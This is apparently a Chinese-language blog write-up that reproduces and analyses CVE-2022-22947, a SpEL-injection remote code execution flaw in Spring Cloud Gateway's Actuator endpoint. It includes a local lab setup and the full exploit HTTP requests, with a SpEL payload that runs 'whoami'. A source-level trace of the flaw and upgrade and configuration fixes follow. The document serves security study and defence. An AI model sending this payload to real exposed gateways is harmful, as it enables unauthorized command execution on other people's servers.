---
icon: edit
date: 2023-04-30
category:
  - 漏洞复现
tag:
  - 漏洞复现
  - CVE
star: true
sticky: true
---

# CVE-2022-22947-Spring Cloud Gateway RCE.md

## 基本介绍

### 微服务架构与 Spring Cloud

### Spring Cloud 生态

### 网关作用与解决方案

### Spring Cloud Gateway

#### 搭建 `SpringCloudGateway` 环境

- 创建 `SpringBoot` 工程，并引入 `maven` 依赖

  ```xml
  <dependency>
      <groupId>org.springframework.cloud</groupId>
      <artifactId>spring-cloud-starter-gateway</artifactId>
      <version>3.1.0</version>
  </dependency>
  
  <dependency>
      <groupId>org.springframework.cloud</groupId>
      <artifactId>spring-cloud-gateway-server</artifactId>
      <version>3.1.0</version>
  </dependency>
  ```

- 修改配置文件

  ```yml
  spring:
    application:
      name: SpringCloudGatewayTest
  
  server:
    port: 9998
  
  management:
    endpoint:
      gateway:
        enabled: true
  ```

- 创建控制器测试环境是否正常

  ```java
  import org.springframework.web.bind.annotation.RequestMapping;
  import org.springframework.web.bind.annotation.RestController;
  
  @RestController
  public class GatewayController {
      @RequestMapping("/")
      public String root() {
          return "Gateway Up and Running!";
      }
  }
  ```

### Spring Boot Actuator

#### 集成 `Actuator` 监控组件

- ```xml
  <dependency>
      <groupId>org.springframework.boot</groupId>
      <artifactId>spring-boot-starter-actuator</artifactId>
  </dependency>
  ```

- 追加配置文件

  ```yml
  spring:
    application:
      name: SpringCloudGatewayTest
  
  server:
    port: 9998
  
  management:
    endpoint:
      gateway:
        enabled: true
    endpoints:
      web:
        exposure:
          include: gateway
  ```

- 创建一个路由（用来测试，直接写在启动文件中）

  ```java
  import org.springframework.boot.SpringApplication;
  import org.springframework.boot.autoconfigure.SpringBootApplication;
  import org.springframework.cloud.gateway.route.RouteLocator;
  import org.springframework.cloud.gateway.route.builder.RouteLocatorBuilder;
  import org.springframework.context.annotation.Bean;
  import org.springframework.web.bind.annotation.RequestMapping;
  
  @SpringBootApplication
  public class SpringCloudGatewayTestApplication {
  
      public static void main(String[] args) {
          SpringApplication.run(SpringCloudGatewayTestApplication.class, args);
      }
  
  
      @Bean
      RouteLocator testRouteLocator(RouteLocatorBuilder routeLocatorBuilder) {
          return routeLocatorBuilder.routes()
                  .route("test", r -> r.path("/test/**").filters(f -> f.rewritePath("/test(?<path>.*)", "/${path}")).uri("https://www.baidu.com"))
                  .route("get", r -> r.path("/get/**").filters(f -> f.addRequestHeader("X-Gateway-Test", "Foo")).uri("https://httpbin.org")).build();
      }
  }
  ```

####  Actuator 操作 Gateway 的接口

`http://localhost:xxxx/actuator/gateway/{id}`

| id              | HTTP Method | 描述                 |
| --------------- | ----------- | -------------------- |
| `globalfilters` | GET         | 返回全局 filter 列表 |
| `routefilters`  | GET         | 每个路由的 filter    |
| `routes`        | GET         | 路由列表             |
| `routes/{id}`   | GET         | 指定路由的信息       |
| `routes/{id}`   | POST        | 创建路由             |
| `routes/{id}`   | DELETE      | 删除路由             |
| `refresh`       | POST        | 刷新路由缓存         |

## 漏洞复现

### 影响范围

- Spring Cloud Gateway < 3.1.1
- Spring Cloud Gateway < 3.0.7

1. 启动 `Spring Cloud Gateway` 服务（为了效果，服务中已经默认定义了两个路由，分别是 `test` 和 `get`）

2. 发送 `POST` 请求添加过滤器（以 `bp` 的 `repeater` 为例来发送请求）

   ```
   POST /actuator/gateway/routes/hacktest HTTP/1.1
   Host: localhost:9998
   Accept-Encoding: gzip, deflate
   Accept: */*
   Accept-Language: en
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
   Connection: close
   Content-Type: application/json
   Content-Length: 329
   
   {
     "id": "hello",
     "filters": [{
       "name": "AddResponseHeader",
       "args": {
         "name": "Result",
         "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}"
       }
     }],
     "uri": "http://example.com"
   }
   ```

   

3. 发送 `POST` 请求刷新过滤器（最后一行加了一个 `a=1` 的参数，是因为在复现时发现不加参数偶尔会出现请求响应超时，这个参数本身没有实际意义）

   ```
   POST /actuator/gateway/refresh HTTP/1.1
   Host: localhost:9998
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Encoding: gzip, deflate
   Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
   Connection: keep-alive
   Content-Length: 3
   Content-Type: application/x-www-form-urlencoded
   Origin: null
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: cross-site
   Upgrade-Insecure-Requests: 1
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
   
   a=1
   ```

   

4. 发送 `GET` 请求访问过滤器（`GET` 请求可以直接在浏览器中访问，需要注意这里的 `id` 是步骤1中创建路由的 `id`，也就是 `url` 中 `routes/hacktest` 中的 `hacktest`， 与 `body` 请求体中的 `id` 无关）

   ```
   http://localhost:9998/actuator/gateway/routes/hacktest
   ```

5. 返回信息如下，可以看到 `whoami` 命令执行并返回了结果

   ```json
   {
       "predicate": "RouteDefinitionRouteLocator$$Lambda$990/114757312",
       "route_id": "hacktest",
       "filters": [
       	"[[AddResponseHeader Result = 'desktop-3s3gqs9\\ambrosecdmeng\r\n'], order = 1]"
       ],
       "uri": "http://example.com:80",
       "order": 0
   }
   ```

   

## 原理分析

### SpEL 表达式

> `SpEL`（Spring Expression Language， Spring 表达语言），是比 `JSP` 的 `EL` 更强大的一种表达式语言。它是从 `Spring 3` 中开始引入的。

#### SpELl 表达式的使用

- `SpEL` 表达式约定放置在 `#{xxx}` 中的
- `SpEL` 表达式支持类型的使用，使用方法就是 `T(类的完整路径)`，如： `T(java.lang.Math).PI` 就可以引用 `PI` 的值

### payload 的成因

1. 构造 `Java` 代码

   - 最终要执行的命令

     ```java
     Process exec = Runtime.getRuntime().exec(new String[]{"whoami"});
     ```

   - 获取执行的结果流

     ```java
     InputStream stream = exec.getInputStream();
     ```

   - 使用 `StreamUtiles` 工具类将结果流转换成字节数组，再使用 `new String` 转换成字符串形式回显

     ```java
     String s = new String(StreamUtils.copyToByteArray(stream));
     ```

2. 整理 `Java` 代码，结合上面写到的 `SpEL` 表达式的使用方法，构造成 `SpEL` 表达式，形成最终 `payload`

   ```java
   #{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"whoami\"}).getInputStream()))}
   ```

### payload 的解析与执行

1. `debug` 模式启动 `Spring Cloud Gateway` 服务端，打开 `debug` 选项卡，选中 `Autuator` 标签，点选左侧 `Show Library Mapping` （一个柱状图图标），然后再选中上方 `Mappings`， 可以看到服务端暴露的接口列表，包含刚用到的 `/actuator/gateway/routes/{id}`、 `/actuator/gateway/refresh` 等，右侧是与之对应的类和方法名。

   ![](/images/cve/payload解析_01.png)

2. 漏洞复现一共执行了 3 个操作，分别是添加、刷新、访问。对应的方法分别是： `AbstractGatewayControllerEndpoint#save`、 `AbstractGatewayControllerEndpoint#refresh`、 `AbstractGatewayControllerEndpoint#route`，在这三个方法入口打上断点，再次进行漏洞复现，并断点跟踪

3. 在对 `AbstractGatewayControllerEndpoint#refresh` 方法内跟踪，发现进入到 `ConfigurationService#normalizeProperties` 中

   ```java
   public class ConfigurationService implements ApplicationEventPublisherAware {
       ...
       @Override
       protected Map<String, Object> normalizeProperties() {
           if (this.service.beanFactory != null) {
               return this.configurable.shortcutType().normalize(this.properties, this.configurable,
                                                                 this.service.parser, this.service.beanFactory);
           }
           return super.normalizeProperties();
       }
       ...
   }
   ```

4. 点击进入 `normalize` 方法，发现进入了 `ShortcutConfigurable` 接口，且这是一个 `abstract` 方法

   ```java
   public abstract Map<String, Object> normalize(Map<String, String> args, ShortcutConfigurable shortcutConf,
   				SpelExpressionParser parser, BeanFactory beanFactory);
   ```

5. `ctrl` + `alt` + `B` 追查实现方法，发现依然在 `ShortcutConfigurable` 接口中，`ctrl` + `F` 搜索 `normalize` 的实现位置，发现该接口中有一个内部静态枚举类，其中包含了 3 个枚举类型，每个枚举类型都对有一个 `normalize` 方法。以 `DEFAULT` 为例，`normalize` 方法中可以看到对 `key` 和 `value` 的处理，而 `value` 应该就是传递过来的 `payload` 内容。（这里贴的是 `idea` 中 `.class` 文件的代码，变量名经过了混淆，如果之前下载过源码，打开的是 `.java` 文件，可能会略有不同，但语义都一样）

   ```java
   public interface ShortcutConfigurable {
       ...
       public static enum ShortcutType {
           DEFAULT {
               public Map<String, Object> normalize(Map<String, String> args, ShortcutConfigurable shortcutConf, SpelExpressionParser parser, BeanFactory beanFactory) {
                   Map<String, Object> map = new HashMap();
                   int entryIdx = 0;
   
                   for(Iterator var7 = args.entrySet().iterator(); var7.hasNext(); ++entryIdx) {
                       Map.Entry<String, String> entry = (Map.Entry)var7.next();
                       String key = ShortcutConfigurable.normalizeKey((String)entry.getKey(), entryIdx, shortcutConf, args);
                       Object value = ShortcutConfigurable.getValue(parser, beanFactory, (String)entry.getValue());
                       map.put(key, value);
                   }
   
                   return map;
               }
           },
           GATHER_LIST {
               ...
           },
           GATHER_LIST_TAIL_FLAG {
               ...
           }
       };
       ...
   }
   ```

6. 继续跟进 `ShortcutConfigurable.getValue` 方法，可以看到开始对 `SpEL` 表达式的约定格式 `#{xxx}` 开始解析，而核心代码，就是标记出来的这两行。

   ```java
   static Object getValue(SpelExpressionParser parser, BeanFactory beanFactory, String entryValue) {
       String rawValue = entryValue;
       if (entryValue != null) {
           rawValue = entryValue.trim();
       }
   
       Object value;
       if (rawValue != null && rawValue.startsWith("#{") && entryValue.endsWith("}")) {
           StandardEvaluationContext context = new StandardEvaluationContext();
           context.setBeanResolver(new BeanFactoryResolver(beanFactory));
           /* 核心代码 */
           Expression expression = parser.parseExpression(entryValue, new TemplateParserContext());
           value = expression.getValue(context);
           /* 核心代码 */
       } else {
           value = entryValue;
       }
   
       return value;
   }
   ```

7. `parseExpression` 方法，主要是对 `SpEL` 表达式经过多层处理，大概如下

   ```java
   public abstract class TemplateAwareExpressionParser implements ExpressionParser {
   	...
   	public Expression parseExpression(String expressionString, @Nullable ParserContext context) throws ParseException {
           return context != null && context.isTemplate() ? this.parseTemplate(expressionString, context) : this.doParseExpression(expressionString, context);
       }
       
       private Expression parseTemplate(String expressionString, ParserContext context) throws ParseException {
           if (expressionString.isEmpty()) {
               return new LiteralExpression("");
           } else {
               Expression[] expressions = this.parseExpressions(expressionString, context);
               return (Expression)(expressions.length == 1 ? expressions[0] : new CompositeStringExpression(expressionString, expressions));
           }
       }
   
       private Expression[] parseExpressions(String expressionString, ParserContext context) throws ParseException {
           List<Expression> expressions = new ArrayList();
           String prefix = context.getExpressionPrefix();
           String suffix = context.getExpressionSuffix();
           int startIdx = 0;
   
           while(startIdx < expressionString.length()) {
               int prefixIndex = expressionString.indexOf(prefix, startIdx);
               if (prefixIndex >= startIdx) {
                   if (prefixIndex > startIdx) {
                       expressions.add(new LiteralExpression(expressionString.substring(startIdx, prefixIndex)));
                   }
   
                   // ...
   
                   String expr = expressionString.substring(prefixIndex + prefix.length(), suffixIndex);
                   expr = expr.trim();
                   if (expr.isEmpty()) {
                       throw new ParseException(expressionString, prefixIndex, "No expression defined within delimiter '" + prefix + suffix + "' at character " + prefixIndex);
                   }
   
                   expressions.add(this.doParseExpression(expr, context));
                   startIdx = suffixIndex + suffix.length();
               } else {
                   expressions.add(new LiteralExpression(expressionString.substring(startIdx)));
                   startIdx = expressionString.length();
               }
           }
   
           return (Expression[])expressions.toArray(new Expression[0]);
       }
   	...
   }
   ```

8. `expression.getValue` 方法则是 `SpEL` 表达式被执行的关键，点击进入，发现又是一个 `abstract` 方法，`ctrl` + `alt` + `B` 跟踪实现类，发现有 3 个，根据经验，应该是 `SpelExpression` 类中的实现（这个无法确定实现类时，最方便的办法就是断点调试，`F7` 直接进入即可）

9. 进入 `SpelExpression` 类

   ```java
   public class SpelExpression implements Expression {
       ...
   	@Nullable
       public Object getValue(EvaluationContext context) throws EvaluationException {
           Assert.notNull(context, "EvaluationContext is required");
           CompiledExpression compiledAst = this.compiledAst;
           if (compiledAst != null) {	// 猜测有可能是自定义编译器，断点调试的时候发现默认为空，所以这一块代码不会执行
               try {
                   return compiledAst.getValue(context.getRootObject().getValue(), context);
               } catch (Throwable var5) {
                   if (this.configuration.getCompilerMode() != SpelCompilerMode.MIXED) {
                       throw new SpelEvaluationException(var5, SpelMessage.EXCEPTION_RUNNING_COMPILED_EXPRESSION, new Object[0]);
                   }
               }
   
               this.compiledAst = null;
               this.interpretedCount.set(0);
           }
   
           ExpressionState expressionState = new ExpressionState(context, this.configuration);
           /* 核心代码 */
           Object result = this.ast.getValue(expressionState);
           /* 核心代码 */
           this.checkCompile(expressionState);
           return result;
       }
       ...
   }
   ```

10. 又是 `getValue` 方法，点击进入，来到 `SpelNodeImpl` 类

    ```java
    public abstract class SpelNodeImpl implements SpelNode, Opcodes {
        ...
        @Nullable
        public final Object getValue(ExpressionState expressionState) throws EvaluationException {
            return this.getValueInternal(expressionState).getValue();
        }
     	...   
    }
    ```

11. 进入 `getValueInternal` 方法，又是一个抽象方法，直接断点继续，发现来到了 `ConstructorReference` 类中的 `getValueInternal` 方法

    ```java
    public class ConstructorReference extends SpelNodeImpl {
        ...
    	public TypedValue getValueInternal(ExpressionState state) throws EvaluationException {
            return this.isArrayConstructor ? this.createArray(state) : this.createNewInstance(state);
        }
        ...
    }
    ```

12. 至此，终于看到了眉目，调用了创建实例的方法，来到 `this.createNewInstance(state)` 方法中

    ```java
    public class ConstructorReference extends SpelNodeImpl {
        ...
        private TypedValue createNewInstance(ExpressionState state) throws EvaluationException {
            Object[] arguments = new Object[this.getChildCount() - 1];
            List<TypeDescriptor> argumentTypes = new ArrayList(this.getChildCount() - 1);
            /* 核心代码 */
            for(int i = 0; i < arguments.length; ++i) {
                TypedValue childValue = this.children[i + 1].getValueInternal(state);
                Object value = childValue.getValue();
                arguments[i] = value;
                argumentTypes.add(TypeDescriptor.forObject(value));
            }
            /* 核心代码。执行到这里的时候，实际上已经获取到输出结果了，看图 */
            ConstructorExecutor executorToUse = this.cachedExecutor;
            // ... 非关键代码，篇幅原因省略
            try {
    			// ... 非关键代码，篇幅原因省略
                
                 /* 核心代码 */
    			return executorToUse.execute(state.getEvaluationContext(), arguments);
                 /* 核心代码 */
            } catch (AccessException var8) {
                
            }
        }
        ...
    }
    ```

    ![](/images/cve/payload解析_refresh_04.png)

    这里获取到的值是 `ASCII` 码，可以尝试 `copy value` 然后转换一下，可以看到，这其实就是 `payload` 中的命令 `whoami` 的输入结果了

    ![](/images/cve/payload解析_refresh_05.png)

## 漏洞修复

- 升级 Spring Cloud Gateway >= 3.0.7 或 >= 3.1.1
- 非业务必要的情况下禁用 `Actuator` 接口
  - `management.endpoint.gateway.enable: false`